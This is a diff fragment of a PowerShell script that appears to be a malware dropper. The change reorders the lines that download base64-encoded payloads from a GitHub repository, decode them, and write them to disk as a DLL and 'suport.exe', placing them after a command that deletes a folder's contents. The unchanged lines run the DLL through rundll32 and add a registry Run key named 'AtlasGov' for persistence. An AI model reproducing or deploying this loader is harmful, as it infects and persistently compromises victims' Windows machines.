@@ -8,9 +8,13 @@ $location = $path_new + $file;
 $location2 = $path_new + "suport" + ".exe";
 $uri = "https://github.com/iskww/Atlas/raw/main/win32.b64";
 $uri2 = "https://github.com/iskww/Atlas/raw/main/reports.b64";
-[System.IO.File]::WriteAllBytes($location,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri)))
-[System.IO.File]::WriteAllBytes($location2,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri2)))
+
 Set-Location $path_new
 Remove-Item *.*
+
+[System.IO.File]::WriteAllBytes($location,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri)))
+[System.IO.File]::WriteAllBytes($location2,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri2)))
+
+
 Start-Process rundll32.exe -ArgumentList "$file, $call" ;
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name "AtlasGov" -Value $location2 -ErrorAction SilentlyContinue
